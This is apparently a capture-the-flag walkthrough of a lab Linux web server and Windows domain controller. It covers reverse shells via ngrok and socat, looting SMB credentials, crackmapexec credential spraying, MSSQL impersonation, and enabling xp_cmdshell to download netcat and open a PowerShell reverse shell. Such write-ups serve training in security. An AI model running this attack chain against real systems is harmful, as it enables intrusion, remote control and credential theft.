### Flag 1
#### 1. Nmap Scan

First, we need to run an Nmap scan on the target domain to identify open ports and services.

```bash
nmap graylog.hackerverse.games
```

**Expected Output:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
```

The key port for our attack is port 8080, which hosts the web application.

#### 2. Crafting the Python Payload

Clone the payload from the Github

```python
https://github.com/monrax/flask-image-bgremover/tree/demo/ctf
```

#### 3. Setting Up the Listener

We need to start a listener on our machine to catch the reverse shell:

```bash
cd /home/ubuntu/flask-image-bgremover-demo-ctf/ctf/scripts
python3 rshell.py
```

To handle potential NAT issues, we can use `ngrok` for port forwarding:

```bash
ngrok tcp 5003
```

Update the Python payload with the forwarded IP and port from `ngrok`.

#### 6. Receiving the Reverse Shell

After setting up a listener, run the `dropin.sh` from the location above with the URL & details of the webserver.

```bash
./dropin.sh
```
This will get you the reverse shell as.

Now this shell is not stable, so to get a stable reverse shell to perform next steps use the following command on the attacker machine.
```bash
ngrok tcp 4242
socat file:`tty`,raw,echo=0 TCP-L:4242
```

and run the following command on the unstable reverse shell.

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4242
```

Make sure to change the IP address and the port number on these two commands, and also one thing to note here is that ngrok does not provide the functionality to forward two ports at one time, so to overcome this you may have a paid version or use two different machines on the same network like a virtual machine with different ngrok account.
#### 7. Enumeration

Perform enumeration to gather information about the system:

```bash
ls /var/www/DomainStuff/Creds
cat /var/www/DomainStuff/Creds/SMBPassCode.txt
```

Example SMB credentials might look like this:

```
Username: samba
Password: The_dataSMBPasscode12
```

#### 8. Checking Domain Membership

Check if the machine is domain-joined:

```bash
realm list
```

Example output might indicate the domain `hackr.games`.

#### 9. Exploring SMB Shares

Check open ports and SMB shares:

```bash
netstat -tuln | grep 'LISTEN'
smbclient -L \\\\localhost\\ -U samba%'The_dataSMBPasscode12'
```

If `MyDomainAccount` is listed, connect to it:

```bash
smbclient \\\\localhost\\MyDomainAccount -U samba%'The_dataSMBPasscode12'
```

Use `mget` to download files:

```bash
mget DomainAccount.txt
cat DomainAccount.txt
```

You may find credentials like:

```
hackr.games\operation:TheOpsPrivs@123
```

Switch to the `operation` user:

```bash
su operation@hackr.games
```

Check the home directory for flags:

```bash
ls /home/operation@hackr.games
cat /home/operation@hackr.games/flag.txt
```

**Flag 1:**
```
flag{S4Mb4_Sh4r3_Sh0uld_Not_C0Nt4in_Cr3d$}
```

### Flag 2
#### 10. Domain Controller Access

Identify the domain controller by checking `/etc/hosts`:

```bash
cat /etc/hosts
```

Example entries:

```
10.10.1.252 hackr.games
10.10.1.252 dc.hackr.games
10.10.0.91  web.hackr.games
```

Spray the credentials on the domain controller:

```bash
crackmapexec smb 10.10.1.252 -u operation -p 'TheOpsPrivs@123'
```

If successful, use `winrm` to log in:

```bash
crackmapexec winrm 10.10.1.252 -u operation -p 'TheOpsPrivs@123'
```

#### 11. Exploring MSSQL Server

Check open ports and MSSQL server login:

```bash
nmap 10.10.1.252
crackmapexec mssql 10.10.1.252 -u operation -p 'TheOpsPrivs@123'
```

Login to MSSQL:

```bash
impacket.mssqlclient HACKR/operation:'TheOpsPrivs@123'@10.10.1.252 -windows-auth
```

Enumerate impersonation privileges:

```sql
enum_impersonate
```

The above `enum_impersonate` command will list the impersonation privileges. Here we can see that the user `operation` can impersonate the user `sys-admin`. Let's do it and get the flag 2.

This will impersonate the user:

```sql
exec_as_login sys-admin
```

List all of the tables user `sys-admin` has access to:

```sql
select * from information_schema.tables
```

We found the table named `flag`, let's dump the flag out and emulate the data exfiltration:

```sql
select * from flag
```

Output:
```
flag{MSSQL_Flag_With_IMPERSONATION}
```

### Flag 3
#### 12. Enabling `xp_cmdshell`

Enable `xp_cmdshell` to execute system commands:

```sql
enable_xp_cmdshell
```

#### 13. Getting Reverse Shell on Domain Controller

Prepare the environment for a reverse shell by taking another reverse shell and running these commands so we can get the shell from the `DC` using `netcat`:

```bash
crackmapexec winrm 10.10.1.252 -u operation -p 'TheOpsPrivs@123' -X 'mkdir C:\Temp'  

crackmapexec winrm 10.10.1.252 -u operation -p 'TheOpsPrivs@123' -X "Invoke-WebRequest -Uri 'https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip' -OutFile \"C:\Temp\netcat-win32-1.11.zip\""

crackmapexec winrm 10.10.1.252 -u operation -p 'TheOpsPrivs@123' -X "Expand-Archive -Path \"C:\Temp\netcat-win32-1.11.zip\" -DestinationPath \"C:\Temp\""
```

Execute `nc` to get a shell, but before this get another reverse shell on a web server and start a listener on it:

```bash
nc -nvlp 3333
```

Now we can do it:

```sql
xp_cmdshell "powershell -ep bypass C:\Temp\netcat-1.11\nc64.exe 10.10.0.91 3333 -e powershell"
```

Read the final flag:

```bash
type C:\Users\Administrator\Desktop\flag.txt
```

**Flag 3:**
```
flag{The_XP_cmd_is_R34lly_B4DD!!!}
```
